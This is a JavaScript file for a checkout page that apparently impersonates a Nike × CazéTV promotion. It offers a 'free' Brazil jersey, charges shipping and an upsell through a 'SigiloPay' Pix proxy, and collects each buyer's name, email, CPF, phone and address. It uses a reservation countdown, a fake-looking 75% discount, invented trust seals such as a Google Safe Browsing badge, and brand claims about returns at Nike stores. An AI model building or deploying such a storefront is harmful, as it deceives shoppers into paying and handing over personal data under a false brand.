function getShippingPrice() {
  return DELIVERY_OPTIONS[AppState.deliveryOption].price;
}

function getUpsellPrice() {
  return AppState.upsellActive ? 19.90 : 0;
}

function getTotalPrice() {
  return getShippingPrice() + getUpsellPrice();
}

// Live-update summary prices without full re-render
function updateSummaryPrices() {
  const total = getTotalPrice();
  const shipping = getShippingPrice();
  const totalEl = document.querySelector('.checkout__summary-total');
  const freteEl = document.getElementById('summary-frete');
  if (totalEl) totalEl.textContent = 'R$ ' + total.toFixed(2).replace('.', ',');
  if (freteEl) freteEl.textContent = 'R$ ' + shipping.toFixed(2).replace('.', ',');
}

// CPF validation — Brazilian algorithm
function validateCPF(cpf) {
  cpf = cpf.replace(/\D/g, '');
  if (cpf.length !== 11) return false;
  // Reject known invalid sequences
  if (/^(\d)\1{10}$/.test(cpf)) return false;
  // Check digit 1
  let sum = 0;
  for (let i = 0; i < 9; i++) sum += parseInt(cpf.charAt(i)) * (10 - i);
  let d1 = 11 - (sum % 11);
  if (d1 >= 10) d1 = 0;
  if (parseInt(cpf.charAt(9)) !== d1) return false;
  // Check digit 2
  sum = 0;
  for (let i = 0; i < 10; i++) sum += parseInt(cpf.charAt(i)) * (11 - i);
  let d2 = 11 - (sum % 11);
  if (d2 >= 10) d2 = 0;
  if (parseInt(cpf.charAt(10)) !== d2) return false;
  return true;
}

// Format CPF: 000.000.000-00
function maskCPF(value) {
  return value
    .replace(/\D/g, '')
    .replace(/(\d{3})(\d)/, '$1.$2')
    .replace(/(\d{3})(\d)/, '$1.$2')
    .replace(/(\d{3})(\d{1,2})/, '$1-$2')
    .substring(0, 14);
}

function renderCheckoutHeader() {
  return `
    <div class="checkout__topbar">
      ${ICONS.clock}
      <span>Reserva expira em <span class="expire-time" data-timer="checkout">${formatTimeMM(AppState.checkoutTimer)}</span></span>
    </div>
    <div class="checkout__header">
      <div class="checkout__header-logos">
        <span style="font-weight:900;font-size:20px;font-style:italic;">NIKE</span>
        <span>×</span>
        <span style="font-weight:800;font-size:14px;">CazéTV</span>
      </div>
      <div class="checkout__header-secure">${ICONS.lock} CHECKOUT SEGURO</div>
    </div>
    <div class="checkout__exchange-bar">
      Trocas e devoluções podem ser feitas em <strong>qualquer loja Nike</strong> do Brasil.
    </div>
  `;
}

function renderStepper(step) {
  const steps = ['Identidade', 'Entrega', 'Pagamento'];
  return `
    <div class="checkout__stepper">
      ${steps.map((s, i) => {
        const num = i + 1;
        let cls = '';
        if (num < step) cls = 'done';
        else if (num === step) cls = 'active';
        const circleContent = num < step ? ICONS.check : num;
        const line = i < steps.length - 1 ? `<div class="checkout__step-line"></div>` : '';
        return `<div class="checkout__step ${cls}">${line}<div class="checkout__step-circle">${circleContent}</div><span class="checkout__step-label">${s}</span></div>`;
      }).join('')}
    </div>
  `;
}

function renderSummary() {
  const total = getTotalPrice();
  const shipping = AppState.checkoutStep >= 2 ? getShippingPrice() : 0;
  const showShipping = AppState.checkoutStep >= 2;
  
  let productsHTML = `
    <div class="checkout__summary-product">
      <div class="checkout__summary-thumb">
        <img src="imgs/Captura de Tela 2026-05-03 às 22.51.08.png" alt="Camisa" />
        <span class="checkout__summary-qty">1</span>
      </div>
      <div>
        <div class="checkout__summary-product-name">Camisa Brasil Nike I 2026/27</div>
        <div class="checkout__summary-product-detail">${AppState.selectedModel} · Tam. ${AppState.selectedSize}</div>
      </div>
    </div>
  `;

  if (AppState.upsellActive && AppState.checkoutStep >= 3) {
    productsHTML += `
      <div class="checkout__summary-product">
        <div class="checkout__summary-thumb">
          <img src="imgs/Captura de Tela 2026-05-03 às 22.52.50.png" alt="Personalização" />
          <span class="checkout__summary-qty">1</span>
        </div>
        <div>
          <div class="checkout__summary-product-name">Personalização Nike</div>
          <div class="checkout__summary-product-detail">${AppState.customName || 'BRASIL'} · Nº ${AppState.customNumber || '10'}</div>
        </div>
      </div>
    `;
  }

  return `
    <div class="checkout__summary">
      <div class="checkout__summary-header">
        <span class="checkout__summary-title">RESUMO DO PEDIDO</span>
        <span class="checkout__summary-total">R$ ${showShipping ? total.toFixed(2).replace('.', ',') : '0,00'}</span>
      </div>
      ${productsHTML}
      <div class="checkout__summary-line">
        <span>Produto</span>
        <span class="free">Grátis</span>
      </div>
      <div class="checkout__summary-line">
        <span>Frete</span>
        <span id="summary-frete">${showShipping ? 'R$ ' + shipping.toFixed(2).replace('.', ',') : 'Não selecionado'}</span>
      </div>
      ${AppState.upsellActive && AppState.checkoutStep >= 3 ? `
      <div class="checkout__summary-line">
        <span>Personalização</span>
        <span class="price">R$ 19,90</span>
      </div>` : ''}
      <div class="checkout__summary-trust">
        <div class="checkout__summary-trust-item">${ICONS.lock} Pagamento 100% seguro e criptografado</div>
        <div class="checkout__summary-trust-item">${ICONS.truck} Entrega rastreada em todo o Brasil</div>
        <div class="checkout__summary-trust-item">${ICONS.shield} Compra protegida — Nike × CazéTV</div>
      </div>
      <div class="checkout__summary-mp">
        <img src="mercadopago.png" alt="Mercado Pago" />
      </div>
    </div>
  `;
}

function renderStep1() {
  return `
    <div class="checkout__form-card">
      ${renderStepper(1)}
      <div class="checkout__field">
        <label class="checkout__label">NOME COMPLETO</label>
        <input type="text" class="checkout__input" id="ck-name" placeholder="Como está no documento" value="${AppState.customerData.name}" />
      </div>
      <div class="checkout__field">
        <label class="checkout__label">E-MAIL</label>
        <input type="email" class="checkout__input" id="ck-email" placeholder="voce@email.com" value="${AppState.customerData.email}" />
        <p class="checkout__hint">Enviaremos o código de rastreio para esse e-mail</p>
      </div>
      <div class="checkout__row">
        <div class="checkout__field">
          <label class="checkout__label">CPF</label>
          <input type="text" class="checkout__input" id="ck-cpf" placeholder="000.000.000-00" value="${AppState.customerData.cpf}" />
          <p class="checkout__hint">Usado apenas para emissão da nota fiscal</p>
        </div>
        <div class="checkout__field">
          <label class="checkout__label">CELULAR / WHATSAPP</label>
          <input type="text" class="checkout__input" id="ck-phone" placeholder="(11) 99999-9999" value="${AppState.customerData.phone}" />
        </div>
      </div>
      <button class="checkout__submit" id="ck-step1-next">
        Continuar para entrega ${ICONS.arrow}
      </button>
    </div>
  `;
}

function renderStep2() {
  return `
    <div class="checkout__form-card">
      ${renderStepper(2)}
      <div class="checkout__field">
        <label class="checkout__label">CEP</label>
        <div style="display:flex;gap:12px;align-items:center;">
          <input type="text" class="checkout__input" id="ck-cep" placeholder="00000-000" value="${AppState.addressData.cep}" style="max-width:200px;" />
          <a href="#" style="font-size:13px;color:#333;text-decoration:underline;">Não sei meu CEP</a>
        </div>
        <p class="checkout__hint">Preenchemos o resto pra você</p>
      </div>
      <div class="checkout__field">
        <label class="checkout__label">RUA / LOGRADOURO</label>
        <input type="text" class="checkout__input" id="ck-rua" value="${AppState.addressData.rua}" />
      </div>
      <div class="checkout__row">
        <div class="checkout__field">
          <label class="checkout__label">NÚMERO</label>
          <input type="text" class="checkout__input" id="ck-numero" value="${AppState.addressData.numero}" />
        </div>
        <div class="checkout__field">
          <label class="checkout__label">COMPLEMENTO (OPCIONAL)</label>
          <input type="text" class="checkout__input" id="ck-complemento" value="${AppState.addressData.complemento}" />
        </div>
      </div>
      <div class="checkout__field">
        <label class="checkout__label">BAIRRO</label>
        <input type="text" class="checkout__input" id="ck-bairro" value="${AppState.addressData.bairro}" />
      </div>
      <div class="checkout__row">
        <div class="checkout__field">
          <label class="checkout__label">CIDADE</label>
          <input type="text" class="checkout__input" id="ck-cidade" value="${AppState.addressData.cidade}" />
        </div>
        <div class="checkout__field">
          <label class="checkout__label">UF</label>
          <input type="text" class="checkout__input" id="ck-uf" maxlength="2" value="${AppState.addressData.uf}" />
        </div>
      </div>

      <label class="checkout__label" style="margin-top:8px;">FORMA DE ENTREGA</label>
      <div class="checkout__delivery-options">
        ${DELIVERY_OPTIONS.map((opt, i) => `
          <div class="checkout__delivery-option ${i === AppState.deliveryOption ? 'selected' : ''}" data-delivery="${i}">
            <div class="checkout__delivery-option-left">
              <div class="checkout__delivery-radio"></div>
              <div>
                <div class="checkout__delivery-name">
                  ${i === 2 ? ICONS.zap : (i === 1 ? ICONS.truck : ICONS.package)}
                  ${opt.name}
                  ${opt.badge ? `<span class="checkout__delivery-badge">${opt.badge}</span>` : ''}
                </div>
                <div class="checkout__delivery-time">${opt.time}</div>
              </div>
            </div>
            <div class="checkout__delivery-price">R$ ${opt.price.toFixed(2).replace('.', ',')}</div>
          </div>
        `).join('')}
      </div>

      <button class="checkout__submit" id="ck-step2-next">
        Continuar para pagamento ${ICONS.arrow}
      </button>
    </div>
  `;
}

function renderStep3() {
  const total = getTotalPrice();
  return `
    <div class="checkout__form-card">
      ${renderStepper(3)}
      <div class="checkout__pix-header">
        ${ICONS.pix}
        <div>
          <div class="checkout__pix-title">Pagamento via Pix</div>
          <div class="checkout__pix-sub">Aprovação imediata · seguro</div>
        </div>
      </div>

      <div class="checkout__upsell">
        <div class="checkout__upsell-header">
          <span>EXCLUSIVO NIKE × CAZÉTV</span>
          <span class="checkout__upsell-discount">-75% SÓ AGORA</span>
        </div>
        <div class="checkout__upsell-body">
          <div class="checkout__upsell-thumb">
            <img src="imgs/Captura de Tela 2026-05-03 às 22.52.50.png" alt="Personalização" />
          </div>
          <div class="checkout__upsell-info">
            <div class="checkout__upsell-name">Deixe sua camisa única.</div>
            <div class="checkout__upsell-desc">Vista a sua história — com nome e número no padrão oficial Nike.</div>
            <div class="checkout__upsell-price">
              <span class="checkout__upsell-old">R$ 79,90</span>
              <span class="checkout__upsell-new">+ R$ 19,90</span>
            </div>
          </div>
          <div class="checkout__upsell-check ${AppState.upsellActive ? 'active' : ''}" id="upsell-toggle">
            ${ICONS.check}
          </div>
        </div>
        ${AppState.upsellActive ? `
        <div class="checkout__upsell-added" id="upsell-added-bar">✓ ADICIONADO AO PEDIDO</div>` :
        `<div class="checkout__upsell-added" id="upsell-added-bar" style="display:none;">✓ ADICIONADO AO PEDIDO</div>`}
        <div id="upsell-custom-fields" style="${AppState.upsellActive ? '' : 'display:none;'}padding:16px;">
          <label class="checkout__label">NOME (ATÉ 15)</label>
          <div class="checkout__custom-fields">
            <input type="text" class="checkout__input" id="ck-custom-name" maxlength="15" placeholder="Seu nome" value="${AppState.customName}" />
            <div>
              <label class="checkout__label">Nº</label>
              <input type="text" class="checkout__input" id="ck-custom-number" maxlength="2" value="${AppState.customNumber || '10'}" style="text-align:center;" inputmode="numeric" pattern="[0-9]*" />
            </div>
          </div>
        </div>
      </div>

      <div class="checkout__pix-info">
        <ul>
          <li>Aprovação em segundos após o pagamento</li>
          <li>QR Code e código copia e cola</li>
          <li>QR Code válido por 30 minutos</li>
        </ul>
      </div>

      <div class="checkout__btn-row">
        <button class="checkout__back-btn" id="ck-step3-back">← Voltar</button>
        <button class="checkout__pix-btn" id="ck-step3-next">
          ${ICONS.lock} Gerar Pix · R$ ${total.toFixed(2).replace('.', ',')}
        </button>
      </div>
    </div>
  `;
}

function renderStep4() {
  const total = getTotalPrice();
  return `
    <div class="checkout__form-card" style="text-align:center;">
      ${renderStepper(4)}
      <h2 class="pix-page__title">Quase lá...</h2>
      <p class="pix-page__sub">Pague seu Pix para garantir <strong>sua compra</strong>.</p>
      <div class="pix-page__status">Aguardando pagamento ✦✦</div>

      <div class="pix-page__qr-box" id="pix-qr-box">
        <div class="pix-page__qr-loading">
          <div class="processing-modal__spinner" style="width:40px;height:40px;border-width:3px;"></div>
          <p style="margin-top:12px;font-size:13px;color:#999;">Gerando código Pix...</p>
        </div>
      </div>
      <p class="pix-page__qr-hint">Escaneie com o app do seu banco</p>

      <div class="pix-page__value">Valor do Pix: <strong>R$ ${total.toFixed(2).replace('.', ',')}</strong></div>

      <button class="pix-page__copy-btn" id="pix-copy" disabled style="opacity:0.5;">${ICONS.copy} Copiar código Pix</button>
      <button class="pix-page__verify-btn" id="pix-verify">${ICONS.refresh} Já paguei, verificar agora</button>

      <div class="pix-page__steps">
        <div class="pix-page__step"><span>1.</span><span>Após copiar o código, abra seu aplicativo de pagamento onde você utiliza o Pix.</span></div>
        <div class="pix-page__step"><span>2.</span><span>Escolha a opção <strong>Pix Copia e Cola</strong> e cole o código.</span></div>
        <div class="pix-page__step"><span>3.</span><span>Confirme o pagamento — a aprovação é imediata e seu pedido será confirmado automaticamente.</span></div>
      </div>

      <div class="pix-page__waiting">${ICONS.refresh} Aguardando confirmação do pagamento...</div>
    </div>
  `;
}

function renderCheckout() {
  let formHTML = '';
  const step = AppState.checkoutStep;
  if (step === 1) formHTML = renderStep1();
  else if (step === 2) formHTML = renderStep2();
  else if (step === 3) formHTML = renderStep3();
  else if (step === 4) formHTML = renderStep4();

  return `
    <div class="screen checkout-page fade-in">
      ${renderCheckoutHeader()}
      <div class="checkout__body">
        ${formHTML}
        ${renderSummary()}
      </div>
      <div class="checkout__terms" style="text-align:center;padding:16px;">
        Ao finalizar, você concorda com os Termos de Uso e a Política de Privacidade.
      </div>

      <footer class="checkout__footer">
        <div class="checkout__footer-inner">

          <div class="checkout__footer-payments">
            <span class="checkout__footer-label">Meios de pagamento</span>
            <div class="checkout__footer-cards">
              <div class="checkout__card-icon">
                <svg viewBox="0 0 48 32" fill="none"><rect width="48" height="32" rx="4" fill="#1A1F71"/><path d="M20.5 21.5h-3.2l2-12.3h3.2l-2 12.3z" fill="#fff"/><path d="M30.8 9.4c-.6-.3-1.6-.5-2.9-.5-3.2 0-5.4 1.7-5.5 4.1 0 1.8 1.6 2.8 2.8 3.4 1.2.6 1.6 1 1.6 1.5 0 .8-1 1.2-1.9 1.2-1.2 0-1.9-.2-2.9-.6l-.4-.2-.4 2.7c.7.3 2.1.6 3.5.6 3.4 0 5.6-1.7 5.6-4.3 0-1.4-.8-2.5-2.7-3.4-1.1-.6-1.8-.9-1.8-1.5 0-.5.6-1 1.8-1 1 0 1.8.2 2.4.5l.3.1.5-2.6z" fill="#fff"/><path d="M35.6 9.2h-2.5c-.8 0-1.3.2-1.7 1l-4.7 11.3h3.4l.7-1.8h4.1l.4 1.8H39l-3.4-12.3zm-3.9 8c.3-.7 1.3-3.4 1.3-3.4l.5-1.3.3 1.2.7 3.5h-2.8z" fill="#fff"/><path d="M16.8 9.2l-3 8.4-.3-1.6c-.6-1.9-2.3-4-4.2-5l2.9 11h3.4l5.1-12.8h-3.9z" fill="#fff"/><path d="M12.1 9.2H6.9l-.1.3c4 1 6.7 3.5 7.8 6.5l-1.1-5.8c-.2-.8-.8-1-1.4-1z" fill="#F7B600"/></svg>
              </div>
              <div class="checkout__card-icon">
                <svg viewBox="0 0 48 32" fill="none"><rect width="48" height="32" rx="4" fill="#252525"/><circle cx="19" cy="16" r="9" fill="#EB001B"/><circle cx="29" cy="16" r="9" fill="#F79E1B"/><path d="M24 9.6a9 9 0 013 6.4 9 9 0 01-3 6.4 9 9 0 01-3-6.4 9 9 0 013-6.4z" fill="#FF5F00"/></svg>
              </div>
              <div class="checkout__card-icon">
                <svg viewBox="0 0 48 32" fill="none"><rect width="48" height="32" rx="4" fill="#016FD0"/><path d="M24 22.3l-2.4-3h-3.5V22l-3.2-6.7h-2.8L9 22.3h2l.6-1.5h3.3l.6 1.5H20v-5l2.5 5h1.7l2.5-5v5h2V15.3h-3.2L24 22.3z" fill="#fff"/><path d="M12.2 19.3l1-2.6 1 2.6h-2zm18.5-4h5.2v1.4h-3.2v1.3h3.1V19.5h-3.1v1.3h3.2v1.5h-5.2V15.3zm6.4 0h2.2l2.5 4.7v-4.7h2v7h-2.2l-2.5-4.7v4.7h-2v-7z" fill="#fff"/></svg>
              </div>
              <div class="checkout__card-icon">
                <svg viewBox="0 0 48 32" fill="none"><rect width="48" height="32" rx="4" fill="#1D1D1B"/><path d="M17 10h14c.6 0 1 .4 1 1v10c0 .6-.4 1-1 1H17c-.6 0-1-.4-1-1V11c0-.6.4-1 1-1z" fill="#FFF100"/><text x="24" y="18" text-anchor="middle" font-size="6" font-weight="700" fill="#1D1D1B">elo</text></svg>
              </div>
              <div class="checkout__card-icon">
                <svg viewBox="0 0 48 32" fill="none"><rect width="48" height="32" rx="4" fill="#f5f5f5"/><text x="24" y="18" text-anchor="middle" font-size="5.5" font-weight="700" fill="#333">DISCOVER</text></svg>
              </div>
              <div class="checkout__card-icon">
                <svg viewBox="0 0 48 32" fill="none"><rect width="48" height="32" rx="4" fill="#f5f5f5"/><rect x="12" y="8" width="3" height="16" rx="1" fill="#333"/><rect x="17" y="8" width="2" height="16" rx="1" fill="#333"/><rect x="21" y="8" width="3" height="16" rx="1" fill="#333"/><rect x="26" y="8" width="2" height="16" rx="1" fill="#333"/><rect x="30" y="8" width="3" height="16" rx="1" fill="#333"/><rect x="35" y="8" width="2" height="16" rx="1" fill="#333"/></svg>
              </div>
              <div class="checkout__card-icon">
                <svg viewBox="0 0 48 32" fill="none"><rect width="48" height="32" rx="4" fill="#00BCCE"/><text x="24" y="19" text-anchor="middle" font-size="8" font-weight="900" fill="#fff">PIX</text></svg>
              </div>
            </div>
          </div>

          <div class="checkout__footer-seals">
            <div class="checkout__seal">
              <svg width="20" height="20" viewBox="0 0 24 24" fill="none"><path d="M12 2L3 7v5c0 5.5 3.8 10.7 9 12 5.2-1.3 9-6.5 9-12V7l-9-5z" fill="#4CAF50"/><path d="M10 14.2l-2.6-2.6L6 13l4 4 8-8-1.4-1.4L10 14.2z" fill="#fff"/></svg>
              <div class="checkout__seal-text">
                <strong>COMPRA SEGURA</strong>
                <span>SITE PROTEGIDO</span>
              </div>
            </div>
            <div class="checkout__seal">
              <svg width="20" height="20" viewBox="0 0 24 24" fill="none"><path d="M12 2L3 7v5c0 5.5 3.8 10.7 9 12 5.2-1.3 9-6.5 9-12V7l-9-5z" fill="#4CAF50"/><path d="M10 14.2l-2.6-2.6L6 13l4 4 8-8-1.4-1.4L10 14.2z" fill="#fff"/></svg>
              <div class="checkout__seal-text">
                <strong>Google</strong>
                <span>Safe Browsing</span>
              </div>
            </div>
          </div>

        </div>

        <div class="checkout__footer-copy">
          Copyright Nike × CazéTV — 2026. Todos os direitos reservados.
        </div>
      </footer>
    </div>
  `;
}

// ===== SIGILOPAY PIX API (via Vercel serverless proxy) =====
const SIGILO_CONFIG = {
  url: '/api/pix'
};

function generateIdentifier() {
  return 'nike_caze_' + Date.now() + '_' + Math.random().toString(36).substring(2, 10);
}

async function createPixPayment() {
  const total = getTotalPrice();
  const identifier = generateIdentifier();

  const products = [
    {
      id: 'camisa-brasil-nike-2026',
      name: 'Camisa Brasil Nike I 2026/27 - ' + AppState.selectedModel + ' - Tam. ' + AppState.selectedSize,
      quantity: 1,
      price: total
    }
  ];

  if (AppState.upsellActive) {
    products.push({
      id: 'personalizacao-nike',
      name: 'Personalização Nike - ' + (AppState.customName || 'BRASIL') + ' Nº ' + (AppState.customNumber || '10'),
      quantity: 1,
      price: 19.90
    });
  }

  const body = {
    identifier: identifier,
    amount: total,
    client: {
      name: AppState.customerData.name,
      email: AppState.customerData.email,
      phone: AppState.customerData.phone,
      document: AppState.customerData.cpf
    },
    products: products,
    metadata: {
      provider: 'NikeCazeTV-Checkout',
      orderId: identifier,
      size: AppState.selectedSize,
      model: AppState.selectedModel,
      delivery: DELIVERY_OPTIONS[AppState.deliveryOption].name
    }
  };

  try {
    const res = await fetch(SIGILO_CONFIG.url, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify(body)
    });

    const data = await res.json();

    if (res.ok && data.pix) {
      // Store pix data in AppState
      AppState.pixData = {
        code: data.pix.code,
        qrBase64: data.pix.base64 || '',
        qrImage: data.pix.image || '',
        transactionId: data.transactionId
      };
      renderPixQR();
    } else {
      renderPixError(data.message || 'Erro ao gerar o Pix. Tente novamente.');
    }
  } catch (err) {
    renderPixError('Erro de conexão. Verifique sua internet e tente novamente.');
  }
}

function renderPixQR() {
  const box = document.getElementById('pix-qr-box');
  if (!box) return;

  const imgSrc = AppState.pixData.qrBase64 || AppState.pixData.qrImage;
  box.innerHTML = imgSrc
    ? `<img src="${imgSrc}" alt="QR Code Pix" style="width:180px;height:180px;border-radius:8px;" />`
    : `<p style="color:#999;font-size:13px;">Use o código Copia e Cola abaixo</p>`;

  // Enable copy button
  const copyBtn = document.getElementById('pix-copy');
  if (copyBtn) {
    copyBtn.disabled = false;
    copyBtn.style.opacity = '1';
  }
}

function renderPixError(msg) {
  const box = document.getElementById('pix-qr-box');
  if (!box) return;
  box.innerHTML = `
    <div style="padding:20px;">
      <p style="color:#ff4444;font-size:14px;font-weight:600;">${msg}</p>
      <button onclick="createPixPayment()" style="margin-top:12px;padding:10px 24px;background:#111;color:#fff;border:none;border-radius:8px;font-weight:600;cursor:pointer;">Tentar novamente</button>
    </div>
  `;
}

function saveFormData(step) {
  if (step === 1) {
    AppState.customerData.name = (document.getElementById('ck-name') || {}).value || '';
    AppState.customerData.email = (document.getElementById('ck-email') || {}).value || '';
    AppState.customerData.cpf = (document.getElementById('ck-cpf') || {}).value || '';
    AppState.customerData.phone = (document.getElementById('ck-phone') || {}).value || '';
  } else if (step === 2) {
    AppState.addressData.cep = (document.getElementById('ck-cep') || {}).value || '';
    AppState.addressData.rua = (document.getElementById('ck-rua') || {}).value || '';
    AppState.addressData.numero = (document.getElementById('ck-numero') || {}).value || '';
    AppState.addressData.complemento = (document.getElementById('ck-complemento') || {}).value || '';
    AppState.addressData.bairro = (document.getElementById('ck-bairro') || {}).value || '';
    AppState.addressData.cidade = (document.getElementById('ck-cidade') || {}).value || '';
    AppState.addressData.uf = (document.getElementById('ck-uf') || {}).value || '';
  } else if (step === 3) {
    AppState.customName = (document.getElementById('ck-custom-name') || {}).value || '';
    AppState.customNumber = (document.getElementById('ck-custom-number') || {}).value || '10';
  }
}

function bindCheckoutEvents() {
  // Step 1 → 2 (with CPF validation)
  const s1next = document.getElementById('ck-step1-next');
  if (s1next) {
    s1next.addEventListener('click', () => {
      saveFormData(1);
      const cpfInput = document.getElementById('ck-cpf');
      if (cpfInput && !validateCPF(cpfInput.value)) {
        cpfInput.style.borderColor = '#ff4444';
        // Show error message
        let errEl = document.getElementById('cpf-error');
        if (!errEl) {
          errEl = document.createElement('span');
          errEl.id = 'cpf-error';
          errEl.style.cssText = 'color:#ff4444;font-size:12px;margin-top:4px;display:block;';
          errEl.textContent = 'CPF inválido. Verifique e tente novamente.';
          cpfInput.parentNode.appendChild(errEl);
        }
        return;
      }
      AppState.checkoutStep = 2;
      navigate('checkout');
    });
  }

  // CPF mask
  const cpfInput = document.getElementById('ck-cpf');
  if (cpfInput) {
    cpfInput.addEventListener('input', () => {
      cpfInput.value = maskCPF(cpfInput.value);
      // Clear error on typing
      cpfInput.style.borderColor = '';
      const errEl = document.getElementById('cpf-error');
      if (errEl) errEl.remove();
    });
  }

  // Step 2 → 3
  const s2next = document.getElementById('ck-step2-next');
  if (s2next) {
    s2next.addEventListener('click', () => {
      saveFormData(2);
      AppState.checkoutStep = 3;
      navigate('checkout');
    });
  }

  // Delivery options
  document.querySelectorAll('[data-delivery]').forEach(opt => {
    opt.addEventListener('click', () => {
      AppState.deliveryOption = parseInt(opt.dataset.delivery);
      document.querySelectorAll('.checkout__delivery-option').forEach(o => o.classList.remove('selected'));
      opt.classList.add('selected');
      // Update summary in real-time
      updateSummaryPrices();
    });
  });

  // Upsell toggle — in-place, no full re-render
  const upsellToggle = document.getElementById('upsell-toggle');
  if (upsellToggle) {
    upsellToggle.addEventListener('click', () => {
      AppState.upsellActive = !AppState.upsellActive;
      // Toggle check icon
      upsellToggle.classList.toggle('active', AppState.upsellActive);
      // Show/hide the upsell-added bar + custom fields
      const addedBar = document.getElementById('upsell-added-bar');
      const customFields = document.getElementById('upsell-custom-fields');
      if (addedBar) addedBar.style.display = AppState.upsellActive ? 'block' : 'none';
      if (customFields) customFields.style.display = AppState.upsellActive ? 'block' : 'none';
      // Update the Pix button total
      const pixBtn = document.getElementById('ck-step3-next');
      if (pixBtn) {
        const total = getTotalPrice();
        pixBtn.innerHTML = `${ICONS.lock} Gerar Pix · R$ ${total.toFixed(2).replace('.', ',')}`;
      }
      // Update summary
      const summaryEl = document.querySelector('.checkout__summary');
      if (summaryEl) summaryEl.outerHTML = renderSummary();
    });
  }

  // Step 3 back
  const s3back = document.getElementById('ck-step3-back');
  if (s3back) {
    s3back.addEventListener('click', () => {
      saveFormData(3);
      AppState.checkoutStep = 2;
      navigate('checkout');
    });
  }

  // Step 3 → 4 (Pix)
  const s3next = document.getElementById('ck-step3-next');
  if (s3next) {
    s3next.addEventListener('click', () => {
      saveFormData(3);
      AppState.checkoutStep = 4;
      navigate('checkout');
    });
  }

  // Draw QR if on step 4 — call real SigiloPay API
  if (AppState.checkoutStep === 4) {
    if (AppState.pixData && AppState.pixData.code) {
      // Already have pix data, just render
      setTimeout(renderPixQR, 100);
    } else {
      setTimeout(createPixPayment, 300);
    }
  }

  // Pix copy — uses real code
  const pixCopy = document.getElementById('pix-copy');
  if (pixCopy) {
    pixCopy.addEventListener('click', () => {
      const code = AppState.pixData ? AppState.pixData.code : '';
      if (!code) return;
      navigator.clipboard.writeText(code).then(() => {
        pixCopy.innerHTML = `${ICONS.check} Código copiado!`;
        setTimeout(() => { pixCopy.innerHTML = `${ICONS.copy} Copiar código Pix`; }, 2000);
      }).catch(() => {
        // Fallback: create temp textarea
        const ta = document.createElement('textarea');
        ta.value = code;
        document.body.appendChild(ta);
        ta.select();
        document.execCommand('copy');
        document.body.removeChild(ta);
        pixCopy.innerHTML = `${ICONS.check} Código copiado!`;
        setTimeout(() => { pixCopy.innerHTML = `${ICONS.copy} Copiar código Pix`; }, 2000);
      });
    });
  }

  // CEP auto-fill
  const cepInput = document.getElementById('ck-cep');
  if (cepInput) {
    cepInput.addEventListener('blur', async () => {
      const cep = cepInput.value.replace(/\D/g, '');
      if (cep.length === 8) {
        try {
          const res = await fetch(`https://viacep.com.br/ws/${cep}/json/`);
          const data = await res.json();
          if (!data.erro) {
            const ruaEl = document.getElementById('ck-rua');
            const bairroEl = document.getElementById('ck-bairro');
            const cidadeEl = document.getElementById('ck-cidade');
            const ufEl = document.getElementById('ck-uf');
            if (ruaEl) ruaEl.value = data.logradouro || '';
            if (bairroEl) bairroEl.value = data.bairro || '';
            if (cidadeEl) cidadeEl.value = data.localidade || '';
            if (ufEl) ufEl.value = data.uf || '';
          }
        } catch(e) { /* silently fail */ }
      }
    });
  }

  // Custom name: letters and spaces only
  const customNameInput = document.getElementById('ck-custom-name');
  if (customNameInput) {
    customNameInput.addEventListener('input', () => {
      customNameInput.value = customNameInput.value.replace(/[^a-zA-ZÀ-ÿ\s]/g, '').toUpperCase();
    });
  }

  // Custom number: digits only
  const customNumberInput = document.getElementById('ck-custom-number');
  if (customNumberInput) {
    customNumberInput.addEventListener('input', () => {
      customNumberInput.value = customNumberInput.value.replace(/[^0-9]/g, '');
    });
  }
}
